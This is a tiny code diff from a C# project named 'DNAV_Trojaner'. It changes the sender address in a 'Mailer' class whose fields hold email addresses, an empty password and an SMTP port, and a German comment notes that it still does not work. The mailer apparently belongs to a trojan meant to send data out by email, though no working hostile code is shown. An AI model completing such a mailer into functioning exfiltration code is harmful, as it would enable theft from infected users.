@@ -9,7 +9,7 @@ namespace DNAV_Trojaner {
     //! Klappt immer noch nicht
     class Mailer {
         public string toEmail = "temp@mail.de";
-        public string fromEmail = "dnav@gmx.com";
+        public string fromEmail = "dnav@gmx.de";
         public string username = "DNAV@gmx.de";
         public string pw = "";
         public int port = 465;
